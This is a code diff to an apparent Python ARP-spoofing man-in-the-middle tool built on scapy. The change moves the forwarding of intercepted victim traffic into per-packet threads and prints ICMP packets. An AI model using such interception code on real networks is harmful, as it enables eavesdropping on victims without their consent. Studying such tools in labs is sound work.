@@ -20,6 +20,7 @@ class Attack_Info(object, ):
         self.mIP = my_ip
         self.gIP = gate_ip
         self.vIP = victim_ip
+        print "gip:", self.gIP
         self.mac = ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))
         self.arp_table = {ip: Attack_Info.get_mac(ip) for ip in [self.vIP,self.gIP]}
 
@@ -108,11 +109,16 @@ class Mitm_Thread(threading.Thread):
         while 1:
             pkt = self.q.get()
             if pkt == "exit": break
-            if pkt.haslayer(sp.IP):
-                ip = pkt.getlayer(sp.IP)
-                get_mac = lambda x: info.arp_table.get(x, info.arp_table[info.gIP])
-                ether = sp.Ether(dst=get_mac(ip.dst))
-                sp.sendp(ether/ip)
+            threading.Thread(target = self.forward, args = (pkt, )).start()
+
+    def forward(self, pkt, ):
+        if pkt.haslayer(sp.IP):
+            ip = pkt.getlayer(sp.IP)
+            get_mac = lambda x: info.arp_table.get(x, info.arp_table[info.gIP])
+            ether = sp.Ether(dst=get_mac(ip.dst))
+            if pkt.haslayer(sp.ICMP):
+                pkt.show()
+            sp.sendp(ether/ip)
 
 
 
